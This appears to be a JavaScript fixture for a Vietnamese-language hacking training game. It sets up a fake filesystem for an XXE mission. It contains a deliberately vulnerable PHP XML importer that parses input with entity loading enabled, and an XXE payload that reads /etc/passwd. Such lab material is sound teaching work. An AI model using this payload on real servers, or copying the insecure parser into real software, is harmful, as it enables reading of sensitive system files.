// Chương 6 — Mission 13: XXE — đọc /etc/passwd qua external entity trong XML upload.
// curl là tool -> output canned (XML response trả nội dung file). FS giữ source import.php.
export default {
  '/': { type: 'dir' },
  '/var': { type: 'dir' },
  '/var/www': { type: 'dir' },
  '/var/www/html': { type: 'dir' },
  '/var/www/html/import.php': {
    type: 'file',
    content: [
      '<?php',
      '// VULN: parse XML người dùng upload với libxml_disable_entity_loader(false) -> XXE',
      '$xml = $_POST["xml"];',
      '$doc = new DOMDocument();',
      '$doc->loadXML($xml, LIBXML_NOENT); // cho phép external entity được nạp',
      'echo $doc->textContent;',
      '?>',
    ].join('\n'),
  },
  '/home': { type: 'dir' },
  '/home/hacker': { type: 'dir' },
  '/home/hacker/payload.xml': {
    type: 'file',
    content: [
      '<?xml version="1.0"?>',
      '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>',
      '<data>&xxe;</data>',
    ].join('\n'),
  },
  '/home/hacker/target.txt': { type: 'file', content: 'Endpoint: http://target/import.php — nhận XML upload, parser cho entity ngoài. Thử payload.xml.' },
};
